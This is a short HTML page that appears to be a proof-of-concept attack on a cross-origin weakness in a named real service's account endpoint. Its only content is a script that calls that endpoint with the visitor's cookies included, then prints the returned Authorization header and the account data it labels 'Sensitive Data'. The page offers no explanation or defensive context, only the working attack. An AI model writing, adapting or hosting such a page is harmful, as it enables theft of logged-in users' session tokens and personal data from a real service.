<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fetch from Iframe</title>
</head>
<body>
   <script>
       fetch("https://clerk.suno.com/v1/me/", {
    method: "GET",
    credentials: "include"
})
.then(response => {
    console.log("Authorization:", response.headers.get("Authorization"));  // Access exposed Authorization header
    return response.json();
})
.then(data => console.log("Sensitive Data:", data));
   </script>
</body>
</html>
